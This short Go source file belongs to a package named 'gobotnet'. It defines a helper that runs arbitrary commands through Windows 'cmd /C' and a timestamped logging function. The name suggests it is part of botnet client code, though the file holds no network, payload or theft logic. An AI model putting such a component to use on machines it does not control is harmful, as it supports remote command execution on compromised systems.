package gobotnet

import (
	"fmt"
	"os/exec"
	"time"
)

func CmdExec(cmd string) ([]byte, error) {
	return exec.Command("cmd", "/C", cmd).Output()
}

func OutMessage(message string) {
	currentTime := time.Now().Local()
	fmt.Println("[", currentTime.Format(time.RFC850), "] "+message)
}
